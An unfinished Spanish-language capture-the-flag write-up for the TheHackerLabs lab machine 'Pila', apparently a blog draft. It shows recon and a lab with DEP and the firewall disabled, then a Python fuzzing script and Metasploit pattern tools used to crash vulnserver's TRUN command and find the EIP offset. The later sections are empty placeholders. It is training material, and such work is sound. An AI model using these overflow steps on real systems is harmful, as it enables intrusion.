---
layout: single
title: Pila - TheHackerLabs
excerpt: "."
date: 2025-02-13
classes: wide
header:
  teaser: /assets/images/THL-writeup-pila/pila.jpg
  teaser_home_page: true
  icon: /assets/images/thehackerlabs.jpeg
categories:
  - TheHackerLabs
  - Medium Machine
tags:
  - Windows
  - 
  - 
  - 
---
![](/assets/images/THL-writeup-pila/pila.jpg)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Hosts">Descubrimiento de Hosts</a></li>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#"></a></li>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Hosts">Descubrimiento de Hosts</h2>

Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.

Lo haremos primero con **nmap**:
```bash
nmap -sn 192.168.1.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:37 CST
...
...
Nmap scan report for 192.168.1.100
Host is up (0.0023s latency).
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
...
...
```

Vamos a probar la herramienta **arp-scan**:
```bash
arp-scan -I eth0 -g 192.168.1.0/24
Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.1.100	XX	PCS Systemtechnik GmbH
.
15 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.112 seconds (121.21 hosts/sec). 15 responded
```

Encontramos nuestro objetivo y es:`192.168.1.100`.

<br>

<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.100
PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=128 time=1.38 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=128 time=0.634 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=128 time=0.733 ms
64 bytes from 192.168.1.100: icmp_seq=4 ttl=128 time=0.999 ms

--- 192.168.1.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3020ms
rtt min/avg/max/mdev = 0.634/0.937/1.382/0.289 ms
```
Por el TTL sabemos que la máquina usa **Windows**, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.100 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:39 CST
Initiating ARP Ping Scan at 13:39
Scanning 192.168.1.100 [1 port]
Completed ARP Ping Scan at 13:39, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:39
Scanning 192.168.1.100 [65535 ports]
Discovered open port 139/tcp on 192.168.1.100
Discovered open port 445/tcp on 192.168.1.100
Discovered open port 80/tcp on 192.168.1.100
Discovered open port 135/tcp on 192.168.1.100
Discovered open port 49152/tcp on 192.168.1.100
Discovered open port 49153/tcp on 192.168.1.100
Discovered open port 9999/tcp on 192.168.1.100
Discovered open port 49157/tcp on 192.168.1.100
Discovered open port 49154/tcp on 192.168.1.100
Discovered open port 49156/tcp on 192.168.1.100
Discovered open port 49155/tcp on 192.168.1.100
Completed SYN Stealth Scan at 13:40, 37.62s elapsed (65535 total ports)
Nmap scan report for 192.168.1.100
Host is up, received arp-response (0.0017s latency).
Scanned at 2025-02-13 13:39:52 CST for 38s
Not shown: 47090 closed tcp ports (reset), 18434 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 128
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
9999/tcp  open  abyss        syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 37.89 seconds
           Raw packets sent: 176289 (7.757MB) | Rcvd: 47107 (1.884MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay pocos puertos abiertos de los que podamos investigar, me parece que la intrusión será por la página web, pero es curioso el **puerto 9999**.

<br>

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 80,135,139,445,9999,49152,49153,49154,49155,49156,49157 192.168.1.100 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-13 13:41 CST
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 36.36% done; ETC: 13:44 (0:01:33 remaining)
Nmap scan report for 192.168.1.100
Host is up (0.0010s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 7.0
|_http-title: 404: archivo o directorio no encontrado.
|_http-server-header: Microsoft-IIS/7.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
9999/tcp  open  vulnserver    Vulnserver
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-13T19:42:41
|_  start_date: 2025-02-13T11:29:39
|_clock-skew: 2s
|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.89 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Me da curiosidad que la página web muestre un error en el escaneo. Además, parece que el **servicio SMB** no pide credenciales para poder entrar.

Y más curioso es el puerto 9999 que lo muestra como **vulnserver**, quizá podamos conectarnos a este servidor.

Pero primero, vamos a ver la página web.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Página Web</h2>

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura1.png">
</p>

Pues si verdad, marca un error.

Si revisamos el código fuente, encontraremos algo interesante:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura2.png">
</p>

Parece ser una ruta.

Vayamos a verla:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura3.png">
</p>

Parece que de aquí podemos descargar unos archivos, entre ellos un binario.

Descarguemos el binario y el **DLL**, los necesitaremos más adelante.

<br>

<h2 id="Binario">Analizando Puerto 9999 y Binario vulnserver.exe Obtenido de Página Web</h2>

Si recordamos, hay un puerto activo con un servidor que se llama **vulnserver**, mismo nombre que tiene el binario.

Vamos a tratar de conectarnos a ese servidor usando **netcat**:
```bash
nc 192.168.1.100 9999
Welcome to Vulnerable Server! Enter HELP for help.
```
Bien, pudimos conectarnos.

Veamos que comandos podemos usar:
```bash
nc 192.168.1.100 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
```
Son bastantes.

Solo ejecutemos uno para ver que sucede:
```bash
STATS
UNKNOWN COMMAND
```
No ocurre nada.

Parece que estamos contra una máquina a la que podremos aplicar **Buffer Overflow**.

Para comprobarlo, vamos a buscar funciones del **lenguaje C y C++** que son vulnerables dentro del binario.

Lo haremos viendo el contenido del binario con el comando **strings** y buscando las funciones vulnerables comunes con **grep**:
```bash
strings vulnserver/vulnserver.exe | grep -E "strcpy|sprintf|gets|scanf|memcpy|strcat"
memcpy
strcpy
_memcpy
_strcpy
__imp__memcpy
__imp__strcpy
```
Excelente, es muy probable que podamos aplicar **Buffer Overflow**.

Te diría que revisaramos los otros servicios, pero ya te digo que debemos aplicar **Buffer Overflow** si o si.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="Laboratorio">Preparando Laboratorio de Pruebas</h2>

Esto será un poco largo, ya que tendremos que realizar un laboratorio de pruebas con distintas herramientas. 

Esto es lo que necesitaras:
* Máquina virtual **Windows 7**: <a href="https://windows-7-home-premium.uptodown.com/windows" target="_blank">Windows 7 Premium</a>
* Herramienta **Immunity Debugger**: <a href="https://github.com/kbandla/ImmunityDebugger" target="_blank">Repositorio de kbandla: Immunity Debugger</a>
* Script **mona.py**: <a href="https://github.com/corelan/mona" target="_blank">Repositorio de corelan: mona.py</a>

Primero debemos preparar la máquina virtual y después instalamos lo demás.

<br>

<h3 id="Windows7">Preparando Máquina Virtual Windows 7</h3>

La instalación es muy simple, pero lo importante es que debes recordar el usuario y contraseña que elijas.

Debes escoger la red **Home Network**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura6.png">
</p>

Puede que se vea muy chica la pantalla, por lo que puedes mejorar cambiando la resolución de la pantalla:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura4.png">
</p>

Además, algo opcional es que puedes descargar **Chrome** para trabajar mejor, pero eso ya es a tu criterio.

Debemos desactivar el **FireWall de Windows** como lo muestro en la siguiente imagén:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura5.png">
</p>

Por último, vamos a desactivar el **DEP (Data Execution Prevention)**, no sin antes dejar su definición:

| **DEP (Data Execution Prevention)** |
|:-----------:|
| *Es una característica de seguridad que protege contra ataques de ejecución de código en memoria. Su objetivo es evitar que un atacante ejecute código malicioso en regiones de memoria destinadas solo a datos, como la pila (stack) o el montículo (heap).* |

<br>

Para desactivarlo, usa el siguiente comando en una **CMD de administrador**:
```batch
bcdedit.exe /set {current} nx AlwaysOff
```
Y reinicia la máquina.

<br>

<h3 id="Immunity">Instalando Immunity Debbuger</h3>

Una vez reiniciada, vamos a descargar la última versión que viene en el repositorio que comparti arriba.

Cuando lo ejecutemos, nos dirá que tenemos que tener instalado **Python 2.7** que no será necesario, ya que se instalara cuando terminemos de instalar el **Immunity Debbuger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura7.png">
</p>

Tan solo debemos aceptar la licencia de uso y no hay que mover nada más:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura8.png">
</p>

Observa que terminando, nos pedirá permiso para instalar **Python 2.7**, así que sigue el wizard de instalación:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura9.png">
</p>

Y con esto, la instalación queda lista.

<br>

<h3 id="Libmona">Instalando Librería mona.py</h3>

Puedes descargar el script desde **GitHub** o puedes copiar el código en un archivo de texto y luego cambiar la extensión a **Python** desde una **CMD**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura10.png">
</p>

Una vez que lo tengas, debemos moverlo a la siguiente ruta que puede variar, aunque normalmente es la de **Program Files (x86)**: `C:/Program File o Program Files (x86)/Immunity Inc/Immunity Debbuger/PyCommands`.

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura11.png">
</p>

Y con esto, nuestro laboratorio esta listo, ya solo debes pasar el binario a tu **máquina virtual Windows 7** y podemos comenzar a hacer pruebas.

<br>

<h2 id="Vulnserver">Aplicando Buffer Overflow a Binario vulnserver.exe</h2>

Al igual que con la **máquina Fawkes**, estos son los pasos que yo considero, son los que se deben aplicar para realizar un **Buffer Overflow**:
* **Primero**: Identificar si un archivo encontrado es un binario.
* **Segundo**: Estudiar y analizar su funcionamiento.
* **Tercer**: Confirmar vulnerabilidad con herramienta **Immunity Debbuger**.
* **Cuarto**: Aplicar Fuzzing para detectar límites del binario.
* **Quinto**: Identificar el **offset**.
* **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
* **Séptimo**: Creación de Shellcode malicioso y creación de Exploit.
* **Octavo**: Búsqueda de **OpCode JMP ESP**.
* **Noveno**: Aplicación de NOPs y/o desplazamiento de pila.
* **Décimo**: Prueba y ejecución de Exploit.

En este momento ya realizamos el primer, segundo y tercer paso.

Por lo que vamos a comenzar con el tercer paso y de ahí en adelante.

<br>

<h3 id="Immunity">Preparando Binario en Immunity Debbuger</h3>

Vamos a ejecutar el binario en nuestra **máquina Windows 7**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura12.png">
</p>

Puedes comprobar que se activa en el **puerto 9999**, conectandote desde tu máquina con **netcat**.

Abre **Immunity Debugger** como administrador:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura13.png">
</p>

Vamos a adjuntar el proceso del binario desde la pestaña **File**, luego seleccionamos la opción **Attach** y escogemos el proceso del binario:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura14.png">
</p>

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura15.png">
</p>

Observa lo que pasa:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura16.png">
</p>

Cada vez que realices este proceso, debemos iniciar el proceso:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura17.png">
</p>

Recuerda bien este proceso, ya que lo repetiremos varias veces.

<br>

<h3 id="Cuarto">Cuarto Paso: Aplicando Fuzzing para Detectar Límites del Binario</h3>

Ahora bien, la idea es aplicar **Fuzzing** para descubrir en que momento se crashea el binario.

Podemos hacerlo con 2 opciones, la primera es utilizar el spiker que hice en la **máquina Fawks**, pero modificado o la segunda, utilizando los scripts de un repositorio específico para explotar este binario.

Primero lo haremos con mi script y luego con el spiker del repositorio.

Ahora probemos con mi script:
```python
#!/usr/bin/python3
import socket
import argparse


def parse_arguments():
        parser = argparse.ArgumentParser(description="Script para fuzzear binarios")
        parser.add_argument("--ip-addr", required=True, help="Dirección IP a utilizar")
        parser.add_argument("--port", type=int, required=True, help="Puerto a utilizar")

        group = parser.add_mutually_exclusive_group(required=True)
        group.add_argument("--length", type=int, help="Cantidad de A's a enviar")
        group.add_argument("--payload", type=str, help="Payload a enviar (texto)")

        return parser.parse_args()


def exploit(ip, port, length, payload):
        try:
                # Creando conexión vía TCP/IP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                print(f"\n[+] Conectando a {ip}:{port}...\n")
                s.connect((ip, port))

                # Recibiendo banner
                banner = s.recv(1024)
                print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")


                # Enviando payload, ya sea A's o uno del usuario
                if length:
                        payload_bytes = b"TRUN /.:/" + (b"A" * length) + b'\r\n'
                elif payload:
                        payload_bytes = b"TRUN /.:/" + payload.encode() + b'\r\n'

                print(f"[*] Payload Enviado: {payload_bytes}\n")
                s.send(payload_bytes)

		# Intentar recibir respuesta (manejar error si el servidor ya crasheó
                try:
                        response = s.recv(1024)
                        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")
                except socket.timeout:
                        print("\n[!] No hay respuesta, el servidor podría haber crasheado.")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
        finally:
                s.close()
                print("\n[+] Cerrando conexión.")


if __name__ == '__main__':
        args = parse_arguments()
        exploit(args.ip_addr, args.port, args.length, args.payload)
```
Ha sido modificado para que tramite A's o un payload del usuario en conjunto al **comando TRUN** que utiliza el binario, esto porque este comando es el que lo crashea.

Probemos:

```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --length 5900

[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...AAA\r\n'

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Y podemos ver que se crashea:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura18.png">
</p>

<br>

Descarga el repo en tu máquina, ya que los otros scripts quizá los ocupemos:
* <a href="https://github.com/shamsher404/Buffer-Overflow-tools" target="_blank">Repositorio de shamsher404: Buffer-Overflow-tools</a>

Una vez que lo tengas, utiliza el **script 1-fuzzer.py**. Le debes indicar la IP de tu máquina virtual:
```bash
python3 1-fuzzer.py
Enter the IP address of the target: 192.168.1.100
Fuzzing vulnserver with 1 bytes 
Fuzzing vulnserver with 100 bytes 
Fuzzing vulnserver with 300 bytes 
Fuzzing vulnserver with 500 bytes 
Fuzzing vulnserver with 700 bytes 
Fuzzing vulnserver with 900 bytes 
Fuzzing vulnserver with 1100 bytes 
Fuzzing vulnserver with 1300 bytes 
Fuzzing vulnserver with 1500 bytes 
Fuzzing vulnserver with 1700 bytes 
Fuzzing vulnserver with 1900 bytes 
Fuzzing vulnserver with 2100 bytes 
Fuzzing vulnserver with 2300 bytes 
Fuzzing vulnserver with 2500 bytes 
Fuzzing vulnserver with 2700 bytes 
Fuzzing vulnserver with 2900 bytes 
Fuzzing vulnserver with 3100 bytes 
Fuzzing vulnserver with 3300 bytes 
Fuzzing vulnserver with 3500 bytes 
Fuzzing vulnserver with 3700 bytes 
Fuzzing vulnserver with 3900 bytes 
Fuzzing vulnserver with 4100 bytes 
Fuzzing vulnserver with 4300 bytes 
Fuzzing vulnserver with 4500 bytes 
Fuzzing vulnserver with 4700 bytes 
Fuzzing vulnserver with 4900 bytes 
Fuzzing vulnserver with 5100 bytes 
Fuzzing vulnserver with 5300 bytes 
Fuzzing vulnserver with 5500 bytes 
Fuzzing vulnserver with 5700 bytes 
Fuzzing vulnserver with 5900 bytes
```
Parece que crashea a los **5900 bytes**.

Y observa el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura18.png">
</p>

Nos indica que el binario se crasheo y podemos ver que se tramitaron muchas A's.

<br>

<h3 id="Quinto">Quinto Paso: Identificando el offset del Binario vulnserver.exe</h3>

Desde aquí, podemos identificar el **offset** que es el número exacto de bytes que necesitas para sobrescribir el **EIP**.

Podemos generar un patrón de distintos caracteres para que sea más fácil identificar el **offset**.

Para esto, vamos a usar una herramienta de **Metasploit pattern_create.rb** para generar **5900 bytes** aleatorios que mandaremos al binario para crashearlo.

Los mandaremos al binario para que se crashee y luego copiaremos el **EIP** resultante, para que con la herramienta de **Metasploit pattern_offset.rb**, podamos descubrir la cantidad exacta de bytes que debemos usar para crashear el binario.

Empecemos por crear los **5900 bytes aleatorios**:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 5900
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4...
...
...
...
```

Mandamos el payload utilizando mi script:
```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --payload "Aa0Aa1Aa2Aa3Aa4Aa5...
[+] Conectando a 192.168.1.100:9999...

[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/Aa0Aa1Aa2Aa3....

[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Observa el resultado en el **Immunity Debugger**:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura19.png">
</p>

Vamos a copiar el **EIP** y usaremos **pattern_offset.rb** para descubrir la cantidad exacta de bytes que debemos usar:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337
[*] Exact match at offset 2003
```
Parece que solo necesitamos **2003 bytes**.

Vamos a comprobarlo:

```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --length 2003

[+] Conectando a 192.168.1.100:9999...


[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAAA....AAAAAAA\r\n'


[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

Y listo, hemos crasheado el binario con la cantidad exacta de bytes:

<p align="center">
<img src="/assets/images/THL-writeup-pila/Captura20.png">
</p>

Observa como el **EIP y el EBP** y como se ve un poco vacio a diferencia de las otras pruebas.

<br>

En el repositorio que descargamos, ya viene un script que ya contiene la cantidad exacta de bytes.

Vamos a probarlo:

```bash

```

<br>

<h3 id=""></h3>



```bash
python3 spiker.py --ip-addr 192.168.1.100 --port 9999 --payload "AAAAAAAAAAAAAAA....AAAAAAAAABBBB"

[+] Conectando a 192.168.1.100:9999...


[+] Recibiendo Banner: 
------
Welcome to Vulnerable Server! Enter HELP for help.

------

[*] Payload Enviado: b'TRUN /.:/AAAAAAAAAAAAAAAAAAAAA.....AAAAAAAABBBB\r\n'


[!] No hay respuesta, el servidor podría haber crasheado.

[+] Cerrando conexión.
```

<br>

<h3 id=""></h3>


```bash

```

```bash

```

```bash

```

```bash

```


```bash

```

```bash

```

```bash

```



<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Post" style="text-align:center;">Post Explotación</h1>
</div>
<br>


<h2 id=""></h2>





<br>
<br>
<div style="position: relative;">
  <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
</div>


links


<br>
# FIN

<footer id="myFooter">
    <!-- Footer para eliminar el botón -->
</footer>

<style>
        #backToIndex {
                display: none;
                position: fixed;
                left: 87%;
                top: 90%;
                z-index: 2000;
                background-color: #81fbf9;
                border-radius: 10px;
                border: none;
                padding: 4px 6px;
                cursor: pointer;
        }
</style>

<a id="backToIndex" href="#Indice">
        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
</a>

<script>
    window.onscroll = function() { showButton() };

    function showButton() {
        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
        const indicePosition = document.getElementById("Indice").offsetTop;
        const footerPosition = document.getElementById("myFooter").offsetTop;
        const windowHeight = window.innerHeight;

        const button = document.getElementById("backToIndex");

        // Mostrar el botón si el usuario ha bajado al índice
        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
            button.style.display = "block";
            button.style.position = "fixed";
            button.style.top = "90%";
        } else {
            button.style.display = "none";
        }
    }
</script>
